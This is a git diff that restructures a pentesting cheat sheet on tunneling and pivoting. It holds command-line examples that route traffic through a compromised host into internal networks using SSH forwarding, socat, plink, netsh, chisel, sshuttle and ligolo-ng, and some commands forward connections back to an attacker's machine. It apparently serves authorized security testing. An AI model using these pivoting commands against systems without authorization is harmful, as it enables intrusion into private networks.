@@ -1,7 +1,8 @@
-# Port Forwarding
+# Tunneling and Pivoting
+## Port Forwarding
 
-## Simple Port Forwarding
-### SSH
+### Simple Port Forwarding
+#### SSH
 ```bash
 # Local port forward example from local port 1234 to 1080 on TARGET_IP.
 # Port listener is on the ATTACK machine.
@@ -12,13 +13,13 @@ ssh USERNAME@COMPROMISED_HOST -L localhost:1234:TARGET_IP:1080
 ssh USERNAME@COMPROMISED_HOST -R 1234:TARGET_IP:1080
 ```
 
-### Socat
+#### Socat
 ```bash
 # Connect from port 1234 on compromised host to port 1080 on target machine.
 socat TCP-LISTEN:1234,fork TCP:TARGET_IP:1080
 ```
 
-### Plink.exe (Windows only)
+#### Plink.exe (Windows only)
 ```bash
 # Local port forward
 plink.exe -ssh -l <USERNAME> -p <PASSWORD> -L localhost:1234:TARGET_IP:1080
@@ -27,14 +28,14 @@ plink.exe -ssh -l <USERNAME> -p <PASSWORD> -L localhost:1234:TARGET_IP:1080
 plink.exe -ssh -l <USERNAME> -p <PASSWORD> -R 1234:TARGET_IP:1080
 ```
 
-### Netsh.exe (Windows only)
+#### Netsh.exe (Windows only)
 ```Powershell
 # Local port forwarding
 netsh interface portproxy add v4tov4 listenport=1234 listenaddress=0.0.0.0 connectport=1080 connectaddress=TARGET_IP
 ```
 
-## Dynamic Port Forwarding
-### SSH
+### Dynamic Port Forwarding
+#### SSH
 ```bash
 # Local dynamic port forwarding through SOCKS5 proxy on port 1080 (Need to set local IP and port 1080 on proxychains configuration)
 ssh -D 1080 USERNAME@COMPROMISED_HOST
@@ -43,7 +44,7 @@ ssh -D 1080 USERNAME@COMPROMISED_HOST
 ssh -R 1080 USERNAME@COMPROMISED_HOST
 ```
 
-### Chisel
+#### Chisel
 ```bash
 # Local pivoting - COMPROMISED HOST being the server
 ./chisel server -v -p 1234 --socks5
@@ -58,13 +59,13 @@ ssh -R 1080 USERNAME@COMPROMISED_HOST
 # Opens listener on port 8080 on COMPROMISED_HOST and directs connections to PORT 80 on ATTACK_IP - useful for webservers / file download in internal network.
 ./chisel client -v ATTACK_IP:1234 R:socks L:0.0.0.0:8080:ATTACK_IP:80
 ```
-### SSHUTTLE
+#### SSHUTTLE
 ```bash
 # Gives access to internal network without use of proxychains similar to VPN.
 sshuttle -r USERNAME@COMPROMISED_HOST:PORT <INTERNAL_SUBNET> <INTERNAL_SUBNET>
 ```
 
-### Ligolo-ng
+#### Ligolo-ng
 ```bash
 # Start server on attack machine (default port 11601)
 ligolo-proxy -selfcert
